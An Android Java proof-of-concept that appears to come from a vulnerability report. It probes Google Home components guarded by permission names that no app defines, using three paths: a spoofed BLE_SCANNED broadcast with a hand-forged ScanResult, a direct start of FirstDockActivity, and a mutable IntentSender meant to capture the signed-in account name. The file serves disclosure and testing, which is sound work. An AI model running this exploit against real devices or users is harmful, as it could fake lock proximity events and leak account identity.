package com.cindrasec.mvrpprobe;

import android.app.Activity;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.le.ScanRecord;
import android.bluetooth.le.ScanResult;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.os.Parcelable;
import android.util.Log;
import android.util.SparseArray;

import java.util.ArrayList;

/**
 * Reaches two exported components in Google Home that are guarded by
 * permission names nothing on the device defines.
 *
 *   adb shell am start -n com.cindrasec.mvrpprobe/.MainActivity --es action broadcast
 *   adb shell am start -n com.cindrasec.mvrpprobe/.MainActivity --es action activity
 *
 * The control APK is this same code built with
 * --rename-manifest-package com.cindrasec.mvrpctl and a manifest that
 * declares no permissions, so the class name stays the same:
 *
 *   adb shell am start -n com.cindrasec.mvrpctl/com.cindrasec.mvrpprobe.MainActivity --es action broadcast
 *
 * Everything this app logs is printed under the tag MVRP. The system's own
 * record of what happened is in `dumpsys activity broadcasts` and logcat's
 * ActivityTaskManager lines, which is what the report relies on.
 */
public class MainActivity extends Activity {

    private static final String TAG = "MVRP";

    private static final String HOME = "com.google.android.apps.chromecast.app";
    private static final String RECEIVER = HOME + ".remotecontrol.safety.LockProximityReceiver";
    private static final String ACTION = HOME + ".remotecontrol.safety.action.BLE_SCANNED";
    private static final String DOCK_ACTIVITY = HOME + ".titan.dock.activity.FirstDockActivity";

    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        String action = getIntent().getStringExtra("action");
        if (action == null) action = "broadcast";

        if ("broadcast".equals(action)) {
            sendBleScanned();
        } else if ("activity".equals(action)) {
            startDockActivity();
        } else if ("dock".equals(action)) {
            startDockActivityWithSender();
        } else {
            Log.i(TAG, "actions: broadcast | activity | dock");
        }
        finish();
    }

    /** Sends the BLE_SCANNED broadcast straight at LockProximityReceiver. */
    private void sendBleScanned() {
        Intent b = new Intent(ACTION);
        b.setComponent(new ComponentName(HOME, RECEIVER));
        b.putExtra("hgs_device_id", "POC-CANARY-ID");
        b.putExtra("device_name", "POC CANARY LOCK");
        b.putExtra("request_id", 1);

        ScanResult sr = buildScanResult();
        if (sr != null) {
            ArrayList<Parcelable> list = new ArrayList<Parcelable>();
            list.add(sr);
            b.putParcelableArrayListExtra("android.bluetooth.le.extra.LIST_SCAN_RESULT", list);
        } else {
            Log.i(TAG, "could not build a ScanResult, sending without the list");
        }

        // The package is logged so the two builds' lines can be told apart
        // without relying on the order they appear in.
        Log.i(TAG, "BROADCAST from " + getPackageName() + " -> " + HOME + "/" + RECEIVER);
        try {
            sendBroadcast(b);
            Log.i(TAG, "sendBroadcast() returned, no exception");
        } catch (SecurityException e) {
            Log.i(TAG, "SECURITY " + e.getMessage());
        } catch (Throwable t) {
            Log.i(TAG, "THREW " + t.getClass().getName() + ": " + t.getMessage());
        }
    }

    /**
     * Starts the second guarded component. sendBroadcast() fails silently
     * when the caller lacks the permission, but startActivity() throws, so
     * this path shows the denial from both sides: the SecurityException
     * here and the ActivityTaskManager line in logcat.
     */
    private void startDockActivity() {
        Intent a = new Intent();
        a.setComponent(new ComponentName(HOME, DOCK_ACTIVITY));
        a.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        Log.i(TAG, "STARTACT from " + getPackageName() + " -> " + HOME + "/" + DOCK_ACTIVITY);
        try {
            startActivity(a);
            Log.i(TAG, "startActivity() returned, no exception");
        } catch (SecurityException e) {
            Log.i(TAG, "SECURITY " + e.getMessage());
        } catch (Throwable t) {
            Log.i(TAG, "THREW " + t.getClass().getName() + ": " + t.getMessage());
        }
    }

    /**
     * Starts the same activity, but hands it an IntentSender of ours.
     *
     * FirstDockActivity.C() reads an IntentSender out of the incoming
     * intent's "android.intent.extra.INTENT" extra, builds a
     * "com.android.wizard.NEXT" intent, copies the wizard extras across
     * from the intent that started it, merges in an "accountName" extra
     * holding the signed-in account, and calls
     * startIntentSenderForResult() on the IntentSender the caller gave it.
     *
     * So this asks the question directly: does Google Home fill that intent
     * with the account name and hand it to an app that only declared an
     * orphaned permission name? Whatever arrives lands in SinkReceiver.
     *
     * The PendingIntent has to be mutable, or the fill-in intent is ignored
     * on Android 12 and later and nothing would arrive even if the app did
     * send it — a silent negative that would look like a working guard.
     */
    private void startDockActivityWithSender() {
        Intent sink = new Intent(this, SinkReceiver.class);
        android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(
                this, 0, sink,
                android.app.PendingIntent.FLAG_UPDATE_CURRENT
                        | android.app.PendingIntent.FLAG_MUTABLE);

        Intent a = new Intent();
        a.setComponent(new ComponentName(HOME, DOCK_ACTIVITY));
        a.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        a.putExtra("android.intent.extra.INTENT", pi.getIntentSender());

        // The extras it copies into the intent it sends back. They are set
        // so the setup flow it launches behaves as it would in the flow this
        // activity belongs to, rather than bailing out early.
        a.putExtra("wizardBundle", new Bundle());
        a.putExtra("firstRun", true);
        a.putExtra("isSetupFlow", true);
        a.putExtra("theme", "glif_v3_light");
        a.putExtra("suw_lifecycle", 0);

        Log.i(TAG, "DOCK from " + getPackageName() + " -> " + HOME + "/" + DOCK_ACTIVITY
                   + "  (handing over our own IntentSender)");
        try {
            startActivity(a);
            Log.i(TAG, "startActivity() returned, no exception");
        } catch (SecurityException e) {
            Log.i(TAG, "SECURITY " + e.getMessage());
        } catch (Throwable t) {
            Log.i(TAG, "THREW " + t.getClass().getName() + ": " + t.getMessage());
        }
    }

    /**
     * Builds a usable ScanResult by writing a Parcel by hand.
     *
     * new ScanResult(device, null, -50, 0L) produces an object whose
     * ScanRecord is null. The receiving side unparcels lazily, and when it
     * cannot build the object getParcelableArrayListExtra() returns null
     * with no exception and no log line, so the receiver's list branch
     * never runs and from outside that looks like nothing happened.
     *
     * ScanRecord has no public constructor and parseFromBytes is hidden, so
     * the Parcel is filled in the order ScanResult.writeToParcel writes its
     * fields and the object is rebuilt with CREATOR.createFromParcel().
     *
     * The advertisement bytes carry company id 76 (0x004C) because that is
     * the one LockProximityReceiver reads out of the scan record.
     *
     * The number of fields BluetoothDevice writes varies between OS
     * versions: on Android 15 an earlier hand-written layout came back with
     * rssi = 5046021 = 0x004CFF05, which is the advertisement bytes read at
     * the wrong offset. So the layout is not assumed. The framework writes
     * its own portion, zero to four extra ints are tried, and a layout is
     * accepted only if rssi reads back as the -50 written here and the
     * manufacturer data is present. Nothing is accepted unverified.
     */
    private ScanResult buildScanResult() {
        // Length-prefixed AD structure, manufacturer specific data (0xFF):
        //   05 FF 4C 00 01 02  ->  len=5, type=0xFF, company=0x004C (LE), data=01 02
        final byte[] adv = new byte[] { 0x05, (byte) 0xFF, 0x4C, 0x00, 0x01, 0x02 };

        BluetoothDevice dev = null;
        try {
            BluetoothAdapter ad = BluetoothAdapter.getDefaultAdapter();
            if (ad != null) dev = ad.getRemoteDevice("AA:BB:CC:DD:EE:FF");
        } catch (Throwable t) {
            Log.i(TAG, "no BluetoothDevice: " + t);
        }
        if (dev == null) {
            Log.i(TAG, "BluetoothDevice is null, cannot build a ScanResult");
            return null;
        }

        for (int pad = 0; pad <= 4; pad++) {
            Parcel p = Parcel.obtain();
            try {
                p.writeInt(1);
                dev.writeToParcel(p, 0);
                for (int k = 0; k < pad; k++) p.writeInt(0);
                p.writeInt(1);
                p.writeByteArray(adv);
                p.writeInt(-50);     // rssi, and the checksum for this layout
                p.writeLong(0L);     // timestampNanos
                p.writeInt(0);       // eventType
                p.writeInt(1);       // primaryPhy
                p.writeInt(0);       // secondaryPhy
                p.writeInt(255);     // advertisingSid
                p.writeInt(127);     // txPower
                p.writeInt(0);       // periodicAdvertisingInterval
                p.setDataPosition(0);

                ScanResult sr = ScanResult.CREATOR.createFromParcel(p);
                ScanRecord rec = sr.getScanRecord();
                boolean mfg = false;
                if (rec != null) {
                    SparseArray<byte[]> m = rec.getManufacturerSpecificData();
                    mfg = m != null && m.get(76) != null;
                }
                Log.i(TAG, "  pad=" + pad + " rssi=" + sr.getRssi()
                           + " scanRecord=" + (rec == null ? "null" : "present")
                           + " mfg[76]=" + (mfg ? "present" : "absent"));
                if (sr.getRssi() == -50 && rec != null && mfg) {
                    Log.i(TAG, "ScanResult is valid, pad=" + pad + " matches this OS");
                    return sr;
                }
            } catch (Throwable t) {
                Log.i(TAG, "  pad=" + pad + " failed: "
                           + t.getClass().getSimpleName() + ": " + t.getMessage());
            } finally {
                p.recycle();
            }
        }
        Log.i(TAG, "no layout produced a valid ScanResult");
        return null;
    }
}
